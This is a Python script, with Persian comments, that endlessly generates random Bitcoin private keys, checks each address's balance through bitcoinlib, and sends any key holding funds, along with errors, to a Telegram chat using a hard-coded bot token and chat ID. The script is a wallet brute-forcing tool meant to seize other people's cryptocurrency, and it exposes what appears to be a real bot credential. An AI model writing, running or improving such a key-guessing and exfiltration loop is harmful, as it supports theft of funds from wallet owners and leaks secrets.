import time
from datetime import datetime
from bitcoinlib.keys import Key
from bitcoinlib.services.services import Service
import threading
import requests

# تنظیمات تلگرام
BOT_TOKEN = "YOUR_BOT_TOKEN"  # توکن ربات تلگرام
CHAT_ID = "YOUR_CHAT_ID"  # آی‌دی چت شما

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{"8001415649:AAHq1CmjwAdnaKcTlH8ircNzGOE1U1SfPxg"}/sendMessage"
    data = {"chat_id": 168557182, "text": message}
    requests.post(url, data=data)

def log_start_time(filename):
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, "a") as f:
        f.write(f"\n=== Program Started at {start_time} ===\n")

def log_check_count(count):
    if count % 100 == 0:
        with open("found_wallets.txt", "a") as f:
            f.write(f"\nChecked {count} wallets so far...\n")

def log_error(error_message, private_key, address):
    error_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("error_log.txt", "a") as f:
        f.write(f"\n=== Error at {error_time} ===\n")
        f.write(f"Private Key: {private_key}\n")
        f.write(f"Address: {address}\n")
        f.write(f"Error: {error_message}\n")
    send_telegram_message(f"⚠️ Error: {error_message}\nAddress: {address}")

def log_warning(message):
    warning_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("error_log.txt", "a") as f:
        f.write(f"\n=== WARNING at {warning_time} ===\n")
        f.write(f"{message}\n")
    send_telegram_message(f"⚠️ WARNING: {message}")

def check_wallet():
    key = Key()
    private_key_wif = key.wif()
    address = key.address()
    
    print("\n🔍 Checking a new wallet...")
    print(f"Private Key (WIF): {private_key_wif}")
    print(f"Bitcoin Address: {address}")
    
    service = Service()
    balance_btc = None
    
    def fetch_balance():
        nonlocal balance_btc
        balance_btc = service.getbalance(address)
    
    thread = threading.Thread(target=fetch_balance)
    thread.start()
    thread.join(timeout=10)  # Timeout after 5 seconds
    
    if thread.is_alive():
        log_error("Timeout: Balance check took too long", private_key_wif, address)
        return None, private_key_wif, address
    
    return balance_btc, private_key_wif, address

def generate_and_check_wallets(delay=0.1):  
    log_start_time("found_wallets.txt")
    log_start_time("error_log.txt")
    
    count = 0
    consecutive_errors = 0
    
    while True:
        try:
            count += 1
            balance_btc, private_key_wif, address = check_wallet()
            
            if balance_btc is None:
                consecutive_errors += 1
                if consecutive_errors >= 3:
                    log_warning("3 consecutive errors detected!")
                    consecutive_errors = 0  # Reset error count after logging
                continue
            
            consecutive_errors = 0  # Reset error count on success
            log_check_count(count)
            
            if balance_btc > 0:
                print(f"\033[92mBalance: {balance_btc} BTC\033[0m")
                print("\n🎉 Found a wallet with balance!")
                with open("found_wallets.txt", "a") as f:
                    f.write(f"Private Key: {private_key_wif}, Address: {address}, Balance: {balance_btc} BTC\n")
                send_telegram_message(f"🎉 Found Wallet!\nBalance: {balance_btc} BTC\nAddress: {address}\nPrivate Key: {private_key_wif}")
            else:
                print(f"\033[91mBalance: {balance_btc} BTC\033[0m")
                print("This wallet has no balance.")
        
        except Exception as e:
            print("❌ Error while checking balance:", e)
            log_error(str(e), private_key_wif, address)
            consecutive_errors += 1
            if consecutive_errors >= 3:
                log_warning("3 consecutive errors detected!")
                consecutive_errors = 0  # Reset error count after logging
        
        time.sleep(delay)

# Run the infinite wallet checker with a delay of 0.1 seconds
generate_and_check_wallets(delay=0.1)
